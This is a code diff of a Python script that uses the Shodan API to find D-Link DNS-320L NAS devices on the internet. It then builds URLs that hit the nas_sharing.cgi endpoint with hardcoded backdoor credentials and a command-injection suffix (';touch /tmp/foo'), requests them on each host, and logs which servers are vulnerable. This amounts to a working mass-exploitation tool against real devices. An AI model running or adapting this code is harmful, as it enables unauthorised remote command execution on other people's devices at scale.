@@ -3,7 +3,7 @@ import shodan
 import socket
 import httplib
 
-SHODAN_API_KEY= '<YOURKEY>'
+SHODAN_API_KEY= 'YOURKEY'
 
 api = shodan.Shodan(SHODAN_API_KEY)
 
@@ -23,20 +23,20 @@ def ipRange(start_ip, end_ip):
 		ip_range.append(".".join(map(str, temp)))    
      	return ip_range
 
-def findTwonkyString(twonkyResponse):
-	if twonkyResponse.find("Twonky") != -1:
+def findResultString(twonkyResponse):
+	if twonkyResponse.find("file_name") != -1:
 		return True
 	else:
 		return False
 
-def requestTwonkyUrls(url):
+def requestResultUrls(url):
 	try: 
-		twonkyResponse = urllib2.urlopen(url, timeout = 1).read()
-		twonkyCheck = findTwonkyString(twonkyResponse)
-		if twonkyCheck == True:
-			print "Twonky Up: %s" % url
-			with open('twonkyHTTP.txt', 'a') as twonkyFileHTTP:
-				twonkyFileHTTP.write(url + "\n")
+		serverResponse = urllib2.urlopen(url, timeout = 5).read()
+		serverCheck = findResultString(serverResponse)
+		if serverCheck == True:
+			print "Server Up and vulnerable: %s" % url
+			with open('serverHTTP.txt', 'a') as serverFileHTTP:
+				serverFileHTTP.write(url + "\n")
 	except urllib2.URLError:
 		pass
 	except socket.timeout:
@@ -47,26 +47,19 @@ def requestTwonkyUrls(url):
         	pass	
 # sample usage
 '''
-ip_range = ipRange("31.20.1.1", "31.20.255.255")
-for ip in ip_range:
-	requestTwonkyUrls(ip, "9000")
-	requestTwonkyUrls(ip, "9001")
-
 try:	
-	for x in range(1,209):
-		results = api.search('Twonky', page=x)
+	for x in range(1,10):
+		results = api.search('DNS-320L', page=x)
 		#print "Results found: %s" %results['total']
 		for result in results['matches']:
 			#requestTwonkyUrls(result['ip_str'], result['port'])
-			print result['ip_str'], result['port']
-			with open('twonkys.txt','a') as twonkyFile:
-				twonkyFile.write("http://" + result['ip_str'] + ":" + str(result['port']) + "/" + "\n")
-
+			#print result['ip_str'], result['port']
+			with open('d_link.txt','a') as resultFile:
+				resultFile.write("http://" + result['ip_str']+ "/cgi-bin/nas_sharing.cgi?dbg=1&cmd=51&user=mydlinkBRionyg&passwd=YWJjMT%20IzNDVjYmE&start=1&count=1;touch+/tmp/foo" + "\n")
 except shodan.APIError, e:
-	print "Error: %s" %e
+	print "Error: %s"%e
 '''
-with open('twonkys.txt', 'r') as twonkyFile:
-	for line in twonkyFile:
+with open('d_link.txt', 'r') as resultFile:
+	for line in resultFile:
 		url = line.strip()
-		requestTwonkyUrls(url)
-
+		requestResultUrls(url)
